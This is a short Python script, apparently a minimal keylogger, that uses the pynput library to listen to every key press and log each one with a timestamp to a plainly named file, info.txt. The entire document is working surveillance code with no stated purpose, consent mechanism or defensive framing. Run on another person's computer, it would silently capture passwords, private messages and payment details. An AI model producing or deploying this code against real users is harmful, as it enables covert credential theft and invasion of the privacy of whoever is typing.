from pynput.keyboard import Key, Listener
import logging

# Blank if same folder
log_dir = ""

logging.basicConfig(filename=(log_dir + "info.txt"), level=logging.DEBUG, format="%(asctime)s: %(message)s")

def on_press(key):
    logging.info(key)

with Listener(on_press=on_press) as listener:
    listener.join()
